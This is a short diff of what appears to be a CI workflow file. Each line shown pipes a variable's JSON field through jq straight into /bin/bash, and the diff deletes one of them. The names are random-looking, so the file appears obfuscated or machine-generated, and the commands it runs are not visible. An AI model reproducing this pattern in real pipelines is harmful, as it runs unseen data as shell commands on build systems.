@@ -28,7 +28,6 @@ jobs:
           echo $btl3 | jq -r .x5712 | /bin/bash
           printf '%s' "$f34704" | jq -r .nxea72837 | /bin/bash
           printf '%s' "$w60" | jq -r .x18 | /bin/bash
-          echo $c5033 | jq -r .v84 | /bin/bash
           echo $aj1 | jq -r .tcw9 | /bin/bash
           printf '%s' "$fofar679" | jq -r .ump10782 | /bin/bash
           echo $ys9 | jq -r .zdz82 | /bin/bash
